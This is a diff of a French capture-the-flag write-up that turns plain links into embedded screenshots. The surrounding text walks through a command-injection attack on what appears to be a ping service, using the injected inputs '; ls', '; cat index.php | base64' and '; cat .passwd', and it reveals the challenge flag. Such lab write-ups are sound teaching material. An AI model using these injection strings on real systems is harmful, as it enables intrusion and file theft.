@@ -12,7 +12,7 @@ Injection utilisée :
 ; ls  
 ```
 Résultat : une réponse contenant index.php.
-[Page Initiale](1.png "Premier screen") 
+![Page Initiale](1.png "Premier screen") 
 
 #### Étape 2 : Lecture du fichier index.php
 
@@ -21,7 +21,7 @@ Injection utilisée :
 ```
 ; cat index.php | base64  
 ```
-[Deuxieme parti](2.png "Deuxieme screen") 
+![Deuxieme parti](2.png "Deuxieme screen") 
 
 Contenu de index.php
 Code source décodé :
@@ -75,7 +75,7 @@ Injection utilisée :
 ```
 ; cat .passwd  
 ```
-[Page Finale](4.png "Dernier screen") 
+![Page Finale](4.png "Dernier screen") 
 
 #### Résultats :
 flag{S3rv1ceP1n9Sup3rS3cure}
